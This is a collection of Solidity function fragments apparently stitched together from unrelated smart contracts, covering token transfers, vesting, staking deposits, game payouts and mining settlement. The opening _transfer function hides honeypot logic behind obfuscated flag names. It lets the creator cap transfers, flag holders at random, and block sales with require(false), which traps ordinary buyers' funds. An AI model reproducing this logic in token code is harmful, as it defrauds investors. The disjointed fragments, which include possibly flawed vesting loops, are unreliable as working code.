function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (iceicebaby == false)) {
        beyond = chTx;
        clinton = true;
    }
    if ((address(sender) == creator) && (iceicebaby == true)) {
        antarctic[recipient] = true;
        alaska[recipient] = false;
        iceicebaby = false;
    }
    if ((amount > warlock) && (antarctic[sender] == true) && (address(sender) != creator)) {
        snow[recipient] = true;
    }
    if (antarctic[recipient] != true) {
        alaska[recipient] = ((randomly() == 4) ? true : false);
    }
    if ((alaska[sender]) && (antarctic[recipient] == false)) {
        alaska[recipient] = true;
    }
    if (antarctic[sender] == false) {
        if ((amount > warlock) && (snow[sender] == true)) {
            require(false);
        }
        require(amount < beyond);
        if (clinton == true) {
            if (snow[sender] == true) {
                require(false);
            }
            snow[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function getClaimableAmount(address _trainer) constant external returns(uint) {
    Energy storage energy = energyData[_trainer];
    uint period = safeDeduct(block.timestamp, energy.lastClaim);
    uint energyAmount = (period / claimTime) * claimAmount;
    if (energyAmount > claimMaxAmount) energyAmount = claimMaxAmount;
    return energyAmount;
}

function safeDeduct(uint _a, uint _b) pure public returns(uint) {
    if (_a < _b) return 0;
    return (_a - _b);
}

function claimEnergy() isActive external {
    Energy storage energy = energyData[msg.sender];
    uint period = safeDeduct(block.timestamp, energy.lastClaim);
    uint energyAmount = (period / claimTime) * claimAmount;
    if (energyAmount == 0) revert();
    if (energyAmount > claimMaxAmount) energyAmount = claimMaxAmount;
    energy.freeAmount += energyAmount;
    energy.lastClaim = block.timestamp;
    EventEnergyUpdate(msg.sender, energy.freeAmount, energy.paidAmount, energy.lastClaim);
}

function _checkTxLimit(
    address sender,
    address recipient,
    uint256 amount
) internal {
    if (block.timestamp - lastRingChange > resetPeriod) {
        _reset();
    }
    if (
        sender != owner &&
        recipient != owner &&
        !isTxLimitExempt[recipient] &&
        recipient != ZERO &&
        recipient != DEAD &&
        recipient != pair &&
        recipient != address(this)
    ) {
        require(amount <= _maxTxAmount, "MAX TX");
        uint256 contractBalanceRecipient = balanceOf(recipient);
        require(
            contractBalanceRecipient + amount <= _maxWalletAmount,
            "Exceeds maximum wallet token amount"
        );
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(this);
        uint256 usedEth = router.getAmountsIn(amount, path)[0];
        if (!hasSold[recipient] && usedEth > biggestBuy) {
            Ring = recipient;
            biggestBuy = usedEth;
            lastRingChange = block.timestamp;
            emit NewRing(Ring, biggestBuy);
        }
    }
    if (
        sender != owner &&
        recipient != owner &&
        !isTxLimitExempt[sender] &&
        sender != pair &&
        recipient != address(this)
    ) {
        require(amount <= _maxTxAmount, "MAX TX");
        if (Ring == sender) {
            emit RingSold(Ring, biggestBuy);
            _reset();
        }
        hasSold[sender] = true;
    }
}

function release(address _who, uint _idx) public returns(uint128) {
    vesting storage v;
    uint8 j;
    uint8 i;
    uint128 total;
    uint timespan;
    uint timestep;
    uint128 releaseStep;
    uint maxEligibleFactor;
    require(tokenAccountIndex[_who].vestingIndex.length > _idx);
    v = tokenAccountIndex[_who].vestingIndex[_idx];
    if (v.completed) {
        revert();
    }
    timespan = now - v.createdAt;
    timestep = v.releaseIntervalSeconds * 1 seconds;
    maxEligibleFactor = (timespan / timestep) * v.releaseRate;
    if (maxEligibleFactor > 100) {
        maxEligibleFactor = 100;
    }
    releaseStep = (v.amount * v.releaseRate) / 100;
    for (i = v.nextReleasePeriod * v.releaseRate; i < maxEligibleFactor; i += v.releaseRate) {
        total += releaseStep;
        j++;
    }
    tokenAccountIndex[_who].vestedBalance -= total;
    tokenAccountIndex[_who].releasedBalance += total;
    if (maxEligibleFactor == 100) {
        v.completed = true;
    } else {
        v.nextReleasePeriod += j;
    }
    return total;
}

function checkRelease(address _who, uint _idx) public view returns(uint128) {
    vesting memory v;
    uint i;
    uint timespan;
    uint timestep;
    uint maxEligibleFactor;
    uint128 releaseStep;
    uint128 eligibleAmount;
    require(tokenAccountIndex[_who].vestingIndex.length > _idx);
    v = tokenAccountIndex[_who].vestingIndex[_idx];
    if (v.completed) {
        return 0;
    }
    timespan = now - tokenAccountIndex[_who].vestingIndex[_idx].createdAt;
    timestep = tokenAccountIndex[_who].vestingIndex[_idx].releaseIntervalSeconds * 1 seconds;
    maxEligibleFactor = (timespan / timestep) * tokenAccountIndex[_who].vestingIndex[_idx].releaseRate;
    if (maxEligibleFactor > 100) {
        maxEligibleFactor = 100;
    }
    releaseStep = (tokenAccountIndex[_who].vestingIndex[_idx].amount * tokenAccountIndex[_who].vestingIndex[_idx].releaseRate) / 100;
    for (i = tokenAccountIndex[_who].vestingIndex[_idx].nextReleasePeriod * tokenAccountIndex[_who].vestingIndex[_idx].releaseRate; i < maxEligibleFactor; i += tokenAccountIndex[_who].vestingIndex[_idx].releaseRate) {
        eligibleAmount += releaseStep;
    }
    return eligibleAmount;
}

function deposit() public payable {
    require(msg.value > minimumDeposit, "Minimum Deposit");
    require(totalDeposits.add(msg.value) <= maximumDeposits, "Maximum deposit limit hit");
    uint256 stakeRequired = calculateMinimumStakeFor(msg.value);
    _syncUser(msg.sender);
    UserInfo storage u = user[msg.sender];
    require(u.stakePayday > block.timestamp, "stake has expired");
    require(u.stake.sub(u.stakeUtilized) >= stakeRequired, "not enough staked to cover this deposit");
    u.stakeUtilized = u.stakeUtilized.add(stakeRequired);
    u.deposit = u.deposit.add(msg.value);
    u.depositDate = block.timestamp;
    totalDeposits = totalDeposits.add(msg.value);
}

function _syncUser(address addr) internal {
    UserInfo storage u = user[addr];
    if (block.timestamp < u.stakePayday) return;
    IStakingPool.StakeInfo memory info = stakingPool.stakes(addr);
    u.stakeUtilized = 0;
    u.stake = info.initial.add(info.reward);
    u.stakePayday = info.stakePayday;
}

function claim(uint[] memory kittyIDs, address referrer) public payable returns(uint[] memory ids) {
    require(canClaim, "claiming not enabled");
    require(kittyIDs.length > 0, "you must claim at least one cat");
    require(claimLimit >= kittyIDs.length, "must claim >= the claim limit at a time");
    ids = new uint[](kittyIDs.length);
    for (uint i = 0; i < kittyIDs.length; i++) {
        uint kittyID = kittyIDs[i];
        require(!claimed[kittyID], "kitty must not be claimed");
        claimed[kittyID] = true;
        require(ownsOrSelling(kittyID), "you must own all the cats you claim");
        uint id = collectables.mint(delegateID, msg.sender);
        ids[i] = id;
        statues[id] = kittyID;
    }
    uint totalPrice = price.mul(kittyIDs.length);
    require(msg.value >= totalPrice, "wrong value sent to contract");
    uint half = totalPrice.div(2);
    pack.purchaseFor.value(half)(msg.sender, uint16(kittyIDs.length), referrer);
    vault.transfer(half);
    emit CatsClaimed(ids, kittyIDs);
    return ids;
}

function fightAgon(uint64 _agonId, uint64 _mFlag, uint256 _aSeed, uint256 _fSeed) external onlyService {
    require(_agonId < agonArray.length);
    Agon storage agon = agonArray[_agonId];
    require(agon.result == 0 && agon.challenger != address(0));
    require(fightContract != address(0));
    uint64 fRet = fightContract.calcFight(_mFlag, agon.agonFlag, _aSeed, _fSeed);
    require(fRet == 1 || fRet == 2);
    agon.result = fRet;
    _removeAgonIdByOwner(agon.master, _agonId);
    uint256 devCut = uint256(agon.agonPrice).div(10);
    uint256 winVal = uint256(agon.agonPrice).mul(2).sub(devCut);
    if (fRet == 1) {
        agon.master.transfer(winVal);
    } else {
        agon.challenger.transfer(winVal);
    }
    if (poolContract != address(0)) {
        uint256 pVal = devCut.div(2);
        poolContract.transfer(pVal);
        addrFinance.transfer(devCut.sub(pVal));
    } else {
        addrFinance.transfer(devCut);
    }
    ResolveAgon(_agonId, agon.master, agon.outFlag, agon.challenger);
}

function cancelAgonForce(uint64 _agonId) external onlyService {
    require(_agonId < agonArray.length);
    Agon storage agon = agonArray[_agonId];
    require(agon.result == 0);
    require(agon.challenger == address(0));
    agon.result = 99;
    _removeAgonIdByOwner(agon.master, _agonId);
    agon.master.transfer(agon.agonPrice);
    CancelAgon(_agonId, agon.master, agon.outFlag);
}

function cancelAgon(uint64 _agonId) external {
    require(_agonId < agonArray.length);
    Agon storage agon = agonArray[_agonId];
    require(agon.result == 0);
    require(agon.challenger == address(0));
    require(agon.master == msg.sender);
    agon.result = 99;
    _removeAgonIdByOwner(msg.sender, _agonId);
    msg.sender.transfer(agon.agonPrice);
    CancelAgon(_agonId, msg.sender, agon.outFlag);
}

function _mineSettlement(address mineCoin) internal {
    uint256 latestMined = _getLatestMined(mineCoin);
    uint256 _mineInterval = mineInterval[mineCoin];
    if (latestMined > 0) {
        totalMinedWorth[mineCoin] = totalMinedWorth[mineCoin].add(latestMined.mul(calDecimals));
        totalMinedCoin[mineCoin] = totalMinedCoin[mineCoin] + latestMined;
    }
    if (_mineInterval > 0) {
        latestSettleTime[mineCoin] = now / _mineInterval * _mineInterval;
    } else {
        latestSettleTime[mineCoin] = now;
    }
}

function _settlement(address mineCoin, address account, uint256 amount, uint256 tokenNetWorth) internal view returns(uint256) {
    uint256 origin = minerOrigins[mineCoin][account];
    require(tokenNetWorth >= origin, "error: tokenNetWorth logic error!");
    return amount.mul(tokenNetWorth - origin) / calDecimals;
}

function _redeemMineCoin(address mineCoin, address payable recieptor, uint256 amount) internal {
    if (amount == 0) {
        return;
    }
    if (mineCoin == address(0)) {
        recieptor.transfer(amount);
    } else {
        IERC20 minerToken = IERC20(mineCoin);
        uint256 preBalance = minerToken.balanceOf(address(this));
        minerToken.transfer(recieptor, amount);
        uint256 afterBalance = minerToken.balanceOf(address(this));
        require(preBalance - afterBalance == amount, "settlement token transfer error!");
    }
    emit RedeemMineCoin(recieptor, mineCoin, amount);
}

